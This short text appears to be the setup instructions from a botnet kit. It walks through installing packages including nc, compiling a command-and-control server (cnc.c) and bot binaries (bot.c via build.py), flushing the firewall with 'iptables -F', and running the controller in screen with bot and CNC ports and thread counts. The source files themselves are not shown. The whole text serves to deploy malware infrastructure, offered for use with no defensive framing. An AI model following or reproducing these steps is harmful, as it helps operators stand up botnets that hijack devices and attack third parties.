Server has to be centos 6/7 (7 is recommended 6 has errors cause servers are outdated.)

1. yum update -y
2. yum install python python-paramiko gcc nano nc screen psmisc bzip2 wget -y
3. gcc cnc.c -o cnc -pthread
4. python build.py bot.c
5. iptables -F
6. screen ./cnc BOT-PORT THREAD (Recommend 1-5) CNC-PORT
7. CRTL + AD (dont have to do this if your wanting to moniter the cnc)

(Your gonna have to change some of this depending on file names!)

- cnc.c to cnc file name
- bot.c to bot file name
- build.py to net build file name


Extra:

instead of using nano to edit logins into a file just open the .txt file its more simple.
to view whats happening after leaving the screen type screen -rx and to leave do CRTL + AD
